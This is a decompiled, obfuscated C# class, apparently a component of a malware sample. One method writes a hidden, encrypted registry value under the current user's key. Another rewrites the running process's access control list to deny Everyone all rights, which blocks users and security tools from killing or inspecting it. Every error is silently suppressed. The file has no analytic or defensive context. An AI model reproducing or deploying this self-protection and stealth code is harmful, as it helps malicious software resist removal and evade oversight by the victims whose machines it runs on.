using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

internal sealed class jPktOOHIICK
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr dCGxKUVxDFO, int fBHeBneXtIz, [Out] byte[] BveRPiVpcYahODs, uint PFtwmanXJcLknr, out uint zLTcJdGhPbLFFCi);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr CWwDkwIChVYE, int EcJIgNNSfuds, [In] byte[] CWbzIWdQvzyg);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void YJKmwkIYZVUf(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107367287)));
			registryKey.SetValue(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107367150)), getString_0(107396211));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor vHzNeATjFufkQ(IntPtr intptr_0)
	{
		byte[] bveRPiVpcYahODs = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, bveRPiVpcYahODs, 0u, out var zLTcJdGhPbLFFCi);
		if ((long)zLTcJdGhPbLFFCi > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, bveRPiVpcYahODs = new byte[zLTcJdGhPbLFFCi], zLTcJdGhPbLFFCi, out zLTcJdGhPbLFFCi))
		{
			return null;
		}
		return new RawSecurityDescriptor(bveRPiVpcYahODs, 0);
	}

	private void LxNpeIEXgA(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void UGlSplAeudPcEL()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = vHzNeATjFufkQ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			LxNpeIEXgA(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static jPktOOHIICK()
	{
		Strings.CreateGetStringDelegate(typeof(jPktOOHIICK));
	}
}
